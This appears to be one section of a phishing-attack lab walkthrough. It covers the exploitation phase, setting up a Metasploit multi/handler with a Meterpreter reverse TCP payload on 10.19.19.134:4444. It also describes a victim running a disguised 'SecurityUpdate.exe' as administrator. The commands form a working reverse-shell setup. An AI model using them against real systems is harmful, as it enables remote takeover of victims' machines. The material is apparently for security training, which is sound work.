# Phase 4: Exploitation

## ðŸŒŸ Objective:
Trigger the execution of the malicious payload on the victim's system.

### Steps:

1. Prepare the Metasploit Framework

    Now that weâ€™ve sent the phishing email and the target has clicked the malicious link, we need to activate the payload using **Metasploit**.

    - **Run the command**: `msfconsole` to start the Metasploit console.

    - Then, use the exploit handler by entering the following command:
```
use exploit/multi/handler
```
- This configures the Metasploit framework to handle incoming connections from the payload on the target system.

2. Configure the Exploit Settings

    Configure Metasploit to match the parameters used when creating the payload:

- Set **PAYLOAD** to `windows/x64/meterpreter/reverse_tcp`
- Set **LHOST** to the attacker's IP address (the system that the victim will connect to).
- Set **LPORT** to the port that the attacker's machine is listening on.
- **Run** the Exploit

### Command Example:

```
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.19.19.134
set LPORT 4444
run
```

This ensures the reverse shell connects back to the attackerâ€™s system on the correct IP and port.

#### Victim Interaction:
- The victim receives the phishing email and clicks the shortened link.
- They download the payload (`SecurityUpdate.exe`) from the attacker's Python HTTP server.

#### Executing the Payload:
- The victim runs the `SecurityUpdate.exe` file via Command Prompt with administrator privileges.
- The malicious executable executes silently in the background.

#### Establishing a Reverse Connection:
- The payload establishes a reverse TCP connection to the attackerâ€™s machine at **10.19.19.134:4444**.
- The attacker gains remote control over the victimâ€™s machine.
